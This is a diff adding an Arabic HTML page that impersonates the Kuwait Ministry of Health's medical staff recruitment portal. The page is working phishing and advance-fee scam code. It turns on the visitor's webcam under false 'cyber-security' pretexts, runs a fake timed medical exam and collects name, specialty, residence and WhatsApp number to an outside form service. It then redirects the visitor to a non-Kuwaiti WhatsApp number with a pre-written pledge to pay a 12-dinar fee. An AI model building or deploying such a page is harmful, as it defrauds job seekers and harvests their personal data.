@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>وزارة الصحة - بوابة الكوادر الطبية والصحية</title>
+    <style>
+        :root {
+            --moh-dark-blue: #0f4c5c;
+            --moh-teal: #118ab2;
+            --moh-gold: #e9c46a;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #333; overflow-x: hidden; }
+
+        /* الشريط العلوي */
+        .top-icons-bar {
+            background-color: #f8f9fa;
+            background-image: linear-gradient(45deg, #eee 25%, transparent 25%, transparent 50%, #eee 50%, #eee 75%, transparent 75%, transparent);
+            background-size: 4px 4px;
+            padding: 12px 0; display: flex; justify-content: center; gap: 20px; border-bottom: 1px solid #ddd;
+        }
+        .icon-btn { background-color: var(--moh-teal); color: white; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 4px; font-size: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+
+        /* الهيدر المكبر */
+        .main-header { 
+            background-color: var(--moh-dark-blue); 
+            padding: 25px 8%; 
+            display: flex; justify-content: space-between; align-items: center; color: white; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+        .logo-section { display: flex; align-items: center; gap: 20px; }
+        .logo-section img { height: 85px; width: auto; } 
+        .logo-text { font-size: 14px; line-height: 1.4; font-weight: bold; }
+
+        /* الواجهة الترحيبية */
+        .hero-section { padding: 80px 12% 60px; text-align: right; }
+        .hero-section h1 { color: var(--moh-dark-blue); font-size: 36px; margin-bottom: 15px; font-weight: 800; }
+        .hero-section p { color: #555; line-height: 2; max-width: 700px; font-size: 20px; }
+
+        /* قسم بيانات الممارس الصحي */
+        .user-info-section {
+            background: #fff; border: 2px solid var(--moh-teal); border-radius: 8px;
+            padding: 25px; margin-bottom: 30px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+        }
+        .info-field { text-align: right; }
+        .info-field label { display: block; margin-bottom: 8px; font-weight: bold; color: var(--moh-dark-blue); }
+        .info-field input, .info-field textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+
+        /* المؤقت الزمني */
+        #timer-box {
+            position: fixed; top: 130px; right: 20px; background: var(--moh-gold); color: #000;
+            padding: 10px 20px; border-radius: 5px; font-weight: bold; font-size: 20px; z-index: 9999;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2); display: none;
+        }
+
+        /* نافذة الكاميرا المتحركة - حجم مصغر */
+        #camBox {
+            position: fixed; top: 160px; left: 30px; width: 140px; 
+            border: 2px solid red; border-radius: 10px; z-index: 10000; background: #000;
+            cursor: move; box-shadow: 0 10px 25px rgba(0,0,0,0.5); touch-action: none; display: none;
+        }
+        .rec-label { color: white; position: absolute; top: 5px; right: 5px; font-size: 9px; background: red; padding: 2px 5px; border-radius: 4px; animation: blink 1s infinite; pointer-events: none; font-weight: bold; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* حاوية الاختبار */
+        .exam-container { display: none; padding: 40px 5%; background: #f4f7fa; min-height: 100vh; }
+        .question-card { 
+            background: white; padding: 35px; border-radius: 5px; margin-bottom: 25px; 
+            border-right: 10px solid var(--moh-gold); box-shadow: 0 4px 15px rgba(0,0,0,0.08); 
+        }
+        .option { display: block; padding: 18px; border: 1px solid #eee; margin: 12px 0; border-radius: 6px; cursor: pointer; transition: 0.3s; font-size: 17px; }
+        .option:hover { background: #f0f7ff; border-color: var(--moh-teal); }
+
+        .btn-main { 
+            background: var(--moh-teal); color: white; border: none; padding: 16px 50px; 
+            border-radius: 5px; font-size: 19px; font-weight: bold; cursor: pointer; 
+            display: inline-flex; align-items: center; gap: 15px; transition: 0.3s; 
+        }
+        .btn-main:hover { background: #0b6a8a; transform: translateY(-2px); }
+
+        .footer-line { text-align: center; margin: 60px 0; position: relative; }
+        .footer-line::before { content: ""; position: absolute; top: 50%; left: 15%; right: 15%; height: 2px; background: var(--moh-gold); z-index: 1; }
+        .footer-text { background: white; padding: 0 30px; position: relative; z-index: 2; font-weight: bold; color: var(--moh-dark-blue); font-size: 26px; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+<div id="timer-box">المتبقي: <span id="timer-display">15:00</span></div>
+
+<div class="top-icons-bar">
+    <div class="icon-btn">🏥</div><div class="icon-btn">🔊</div><div class="icon-btn">✉️</div><div class="icon-btn">👤</div>
+</div>
+
+<div class="main-header">
+    <div style="font-size: 32px; cursor: pointer;">☰</div>
+    <div class="logo-section">
+        <div class="logo-text">وزارة الصحة<br>Ministry of Health<br>دولة الكويت | State of Kuwait</div>
+        <img src="logo.png" alt="شعار وزارة الصحة">
+    </div>
+</div>
+
+<div id="homePage">
+    <div class="hero-section">
+        <h1>مرحبا بكم في موقع وزارة الصحة</h1>
+        <h2 style="color: var(--moh-teal); font-size: 30px;">بوابة تسجيل الكوادر الطبية والتوظيف</h2>
+        <p>
+            تقدم وزارة الصحة منظومة خدمات إلكترونية متكاملة للممارسين الصحيين والمتقدمين الجدد، بهدف تيسير إجراءات الفحص والتدقيق المهني وضمان تحقيق أعلى معايير الكفاءة الطبية والتشغيلية.
+        </p>
+        <button class="btn-main" onclick="initiateSystem()">فتح الرابط ←</button>
+    </div>
+    <div class="footer-line"><span class="footer-text">خدماتنا الطبية</span></div>
+</div>
+
+<div id="camBox">
+    <div class="rec-label">● نظام رصد مفعل</div>
+    <video id="video" width="100%" autoplay muted style="border-radius: 8px; pointer-events: none;"></video>
+</div>
+
+<div id="examPage" class="exam-container">
+    <div style="max-width: 1100px; margin: auto;">
+        <div style="background: var(--moh-dark-blue); color: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center; font-size: 18px; font-weight: bold;">
+            ⚠️ تحذير: المعاينة مراقبة إلكترونياً. يمنع الخروج من وضع ملء الشاشة أو فتح متصفحات أخرى لمنع إلغاء الطلب.
+        </div>
+
+        <form id="medicalForm" action="https://formspree.io/f/xyklopqd" method="POST">
+            <div class="user-info-section">
+                <div class="info-field">
+                    <label>الاسم الرباعي:</label>
+                    <input type="text" name="الاسم الكامل" id="name" placeholder="أدخل اسمك كما في الجواز" required>
+                </div>
+                <div class="info-field">
+                    <label>التخصص الطبي الفرعي:</label>
+                    <input type="text" name="التخصص" id="spec" placeholder="مثال: طب عام / تمريض / تخدير" required>
+                </div>
+                <div class="info-field">
+                    <label>مكان الإقامة الحالي:</label>
+                    <input type="text" name="مكان الإقامة" id="loc" placeholder="المدينة / الدولة" required>
+                </div>
+                <div class="info-field">
+                    <label>رقم الواتساب المتصل:</label>
+                    <input type="tel" name="رقم الواتساب" id="phone" placeholder="+000" required>
+                </div>
+            </div>
+
+            <div id="questionsList"></div>
+
+            <div class="question-card">
+                <h3 style="color:var(--moh-dark-blue)">سؤال تخصصي: تحدث عن رؤيتك للالتزام بأخلاقيات المهنة الطبية، وطبيعة التعامل المهني بينك وبين المريض من جهة، وبينك وبين الإدارة الطبية والزملاء في المستشفى من جهة أخرى.</h3>
+                <textarea name="رؤية الممارس الطبي والعملية الصحية" rows="6" style="width:100%; padding:10px; font-size:16px; border:1px solid #ccc; border-radius:4px;" placeholder="اكتب رؤيتك المهنية هنا بالاستفاضة..." required></textarea>
+            </div>
+            
+            <button type="submit" class="btn-main" style="background: #28a745; width: 100%; justify-content: center; margin-top: 20px;">إرسال التقرير النهائي للجنة التقييم الطبي</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    // --- منع الدخول المتكرر ---
+    window.onload = function() {
+        if (localStorage.getItem("moh_exam_done") === "true") {
+            document.body.innerHTML = `
+                <div style="height: 100vh; display: flex; align-items: center; justify-content: center; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; direction: rtl;">
+                    <div style="background: white; padding: 50px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 8px solid #d9534f; max-width: 600px; text-align: center;">
+                        <div style="font-size: 70px; margin-bottom: 20px;">⚠️</div>
+                        <h2 style="color: #0f4c5c; margin-bottom: 15px;">تنبيه أمني نظامي</h2>
+                        <p style="font-size: 19px; color: #555; line-height: 1.8;">
+                            عذراً، يمنع النظام تكرار إجراء معاينة الكفاءة من نفس الجهاز. لقد تم تسجيل دخولك مسبقاً وإرسال بياناتك إلى قاعدة بيانات وزارة الصحة.
+                        </p>
+                        <hr style="margin: 25px 0; border: 0; border-top: 1px solid #eee;">
+                        <p style="font-size: 15px; color: #888;">في حال وجود خطأ تقني، يرجى مراجعة قسم الدعم الفني لوزارة الصحة.</p>
+                    </div>
+                </div>
+            `;
+            return;
+        }
+    };
+
+    const box = document.getElementById("camBox");
+    let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
+    let timer;
+
+    // بنك الأسئلة الطبي: 9 لغة عربية + 5 لغة إنجليزية
+    const quizData = [
+        { q: "ما هو الإجراء الفوري الأصح عند اشتباهك بإصابة مريض بعدوى وبائية منقولة بالهواء داخل الجناح؟", a: ["صرف مضاد حيوي واسع المدى فورا", "عزل المريض في غرفة ضغط سلبي وتطبيق بروتوكول مكافحة العدوى", "الانتظار حتى مرور طبيب الاستشاري في اليوم التالي", "نقل المريض إلى قسم الطوارئ مباشرة"] },
+        { q: "تعتمد معايير سلامة المرضى الدولية (JCI) بشكل أساسي على:", a: ["السرعة في إنهاء المعاملات الورقية", "التحقق من هوية المريض عبر مؤشرين على الأقل قبل تقديم أي علاج", "تقليل عدد الكادر الطبي في الشفت اللمسائي", "الاعتماد على الوصفات الشفهية"] },
+        { q: "كيف تتعامل مع مريض يرفض أخذ جرعة العلاج المقررة له بشكل قطعي؟", a: ["إجباره على تناول العلاج لحمايته", "احترام رغبته مؤقتاً وتوثيق الرفض وشرح العواقب الطبية له وإبلاغ الطبيب المسؤول", "إهمال المريض وعدم تكرار الزيارة له", "صرف جرعة مضاعفة في الوجبة التالية"] },
+        { q: "عند حدوث خطأ دوائي أو طبي (Medication Error)، ما هو السلوك المهني المطلوب؟", a: ["إخفاء الخطأ وتعديل الملف الطبي سراً", "التبليغ الفوري عبر نموذج الحوادث العارضة (OVR) لضمان سلامة المريض ومعالجة الخلل", "إلقاء اللوم على كادر التمريض أو الصيدلية", "تجاهل الأمر إذا لم تظهر أعراض على المريض"] },
+        { q: "ما هي القاعدة الأساسية في حفظ ونقل وحقن الأدوية المخدرة والمهدئة خاضعة الرقابة؟", a: ["تخزينها في أي خزانة مفتوحة لتسهيل الوصول", "الحفظ في خزانة مقفلة بإحكام والتوثيق المزدوج للصرف والجرعات التالفة", "صرفها بناءً على طلب شفهي من المريض", "عدم جردها إلا نهاية العام"] },
+        { q: "أي من المعايير التالية هو الأهم عند تعبئة التقرير الطبي أو تدوين الملاحظات السريرية؟", a: ["الدقة، والموضوعية، والتدوين الفوري مع ذكر الوقت والتاريخ والتوقيع المهني", "استخدام خط غير واضح لحفظ خصوصية المريض", "تعديل الملاحظات القديمة دون إذن", "كتابة التقرير بناء على ما ينقله المرافقون فقط"] },
+        { q: "كيف تصنف حالات الطوارئ الطبية عند فرز المرضى (Triage) في المستشفى؟", a: ["حسب أسبقية الحضور والوصول للمستشفى", "بناءً على حدة الحالة الطبية وخطورتها على الحياة والمؤشرات الحيوية", "حسب عمر المريض أو جنسيته", "بناء على رغبة المريض والمرافقين"] },
+        { q: "ما هو الإجراء الأمثل في حال ملاحظتك لخلل في المؤشرات الحيوية لمريض بعد الجراحة؟", a: ["الانتظار لمدة ساعتين لإعادة الفحص", "إبلاغ الطبيب الجراح أو طبيب الخفارة فوراً وتقديم الدعم الأولي اللازم للحالة", "إعطاء المريض مسكنات للألم فقط", "طلب خروج للمريض على مسؤوليته"] },
+        { q: "أي مما يلي يعتبر الركيزة الأساسية للوقاية من العدوى المتقاطعة (Cross-Infection) بين المرضى؟", a: ["غسل وتطهير الأيدي بانتظام قبل وبعد ملامسة كل مريض طبقاً لتوجيهات منظمة الصحة العالمية", "ارتداء الكمامة فقط طوال فترة العمل", "تنظيف الجناح مرة واحدة أسبوعياً", "استخدام المضادات الحيوية الوقائية لجميع الكوادر"] },
+        
+        // الـ 5 أسئلة التخصصية باللغة الإنجليزية
+        { q: "Which of the following is the standard first-line treatment for a patient experiencing anaphylactic shock?", a: ["Intravenous Normal Saline only", "Intramuscular Epinephrine (Adrenaline)", "Oral Antihistamines", "Subcutaneous Insulin"] },
+        { q: "What does the medical acronym 'CPR' stand for?", a: ["Cardiopulmonary Resuscitation", "Cardio Pulse Rate", "Central Pressure Recording", "Clinical Patient Report"] },
+        { q: "What is the primary clinical purpose of performing a blood culture test?", a: ["To measure hemoglobin and red blood cells count", "To detect and identify systemic bacterial or fungal infections in the blood", "To check blood glucose and lipid levels", "To determine the patient's blood group"] },
+        { q: "When assessing a patient using the Glasgow Coma Scale (GCS), which three clinical responses are evaluated?", a: ["Pulse, Respiration, and Blood Pressure", "Eye opening, Verbal response, and Motor response", "Temperature, Pain reflex, and Pupil size", "Heart rate, Oxygen saturation, and Mobility"] },
+        { q: "Under HIPAA and international healthcare standards, patient medical records must be handled with:", a: ["Strict confidentiality and shared only with authorized medical personnel involved in the care", "Open access for anyone working in the hospital administrative departments", "Public dissemination for educational purposes without consent", "Destruction immediately after the patient is discharged from the clinic"] }
+    ];
+
+    document.addEventListener("mousedown", dragStart);
+    document.addEventListener("mouseup", dragEnd);
+    document.addEventListener("mousemove", drag);
+
+    function dragStart(e) {
+        if (e.target === box) {
+            initialX = e.clientX - xOffset;
+            initialY = e.clientY - yOffset;
+            active = true;
+        }
+    }
+    function dragEnd() { initialX = currentX; initialY = currentY; active = false; }
+    function drag(e) {
+        if (active) {
+            e.preventDefault();
+            currentX = e.clientX - initialX;
+            currentY = e.clientY - initialY;
+            xOffset = currentX; yOffset = currentY;
+            box.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
+        }
+    }
+
+    function startTimer(duration, display) {
+        var timerValue = duration, minutes, seconds;
+        timer = setInterval(function () {
+            minutes = parseInt(timerValue / 60, 10);
+            seconds = parseInt(timerValue % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+
+            if (--timerValue < 0) {
+                clearInterval(timer);
+                alert("انتهى الوقت المحدد للمعاينة. سيتم إرسال الإجابات تلقائياً.");
+                document.getElementById('medicalForm').submit();
+            }
+        }, 1000);
+    }
+
+    function initiateSystem() {
+        localStorage.setItem("moh_exam_done", "true");
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            document.getElementById('video').srcObject = stream;
+            document.getElementById('camBox').style.display = 'block';
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('examPage').style.display = 'block';
+            document.getElementById('timer-box').style.display = 'block';
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            startTimer(15 * 60, document.getElementById('timer-display'));
+            renderQuestions();
+        }).catch(() => {
+            alert("يجب تفعيل الكاميرا للمتابعة حسب معايير الأمن السيبراني لوزارة الصحة.");
+        });
+    }
+
+    function renderQuestions() {
+        const container = document.getElementById('questionsList');
+        quizData.forEach((item, index) => {
+            let qNum = index + 1;
+            // تحديد اتجاه النص بناءً على لغة السؤال لضمان المظهر الصحيح
+            let isEnglish = qNum > 9;
+            let directionStyle = isEnglish ? "direction: ltr; text-align: left;" : "direction: rtl; text-align: right;";
+            
+            let optionsHtml = item.a.map((opt) => `
+                <label class="option" style="${directionStyle}">
+                    <input type="radio" name="سؤال ${qNum}: ${item.q}" value="${opt}" required> ${opt}
+                </label>
+            `).join('');
+            
+            container.innerHTML += `
+                <div class="question-card" style="${directionStyle}">
+                    <h3 style="color:var(--moh-dark-blue)">${isEnglish ? 'Question' : 'سؤال'} ${qNum}: ${item.q}</h3>
+                    ${optionsHtml}
+                </div>`;
+        });
+    }
+
+    document.addEventListener("visibilitychange", () => {
+        if (document.hidden) alert("⚠️ تنبيه أمني: تم رصد مغادرة نافذة الفحص والتقييم الطبي. تم تسجيل المحاولة.");
+    });
+
+    document.getElementById('medicalForm').onsubmit = function(e) {
+        e.preventDefault();
+        clearInterval(timer);
+
+        const name = document.getElementById('name').value;
+        const spec = document.getElementById('spec').value;
+        const myWhatsApp = "249993368535"; 
+        
+        const message = `السلام عليكم، أنا الممارس الطبي: ${name}%0Aالتخصص: ${spec}%0Aلقد أنهيت المعاينة الطبية الإلكترونية بنجاح وأؤكد الالتزام بدفع رسوم التدقيق المهني واللجنة البالغة 12 دينار كويتي أو ما يعادلها.`;
+
+        fetch(this.action, {
+            method: 'POST',
+            body: new FormData(this),
+            headers: { 'Accept': 'application/json' }
+        }).then(() => {
+            alert("تم إرسال بياناتك وإجاباتك بنجاح إلى لجنة التقييم والتدقيق بوزارة الصحة.");
+            window.location.href = `https://wa.me/${myWhatsApp}?text=${message}`;
+        }).catch(() => {
+            alert("تم إرسال بياناتك وإجاباتك بنجاح إلى لجنة التقييم والتدقيق بوزارة الصحة.");
+            window.location.href = `https://wa.me/${myWhatsApp}?text=${message}`;
+        });
+    };
+</script>
+
+</body>
+</html>
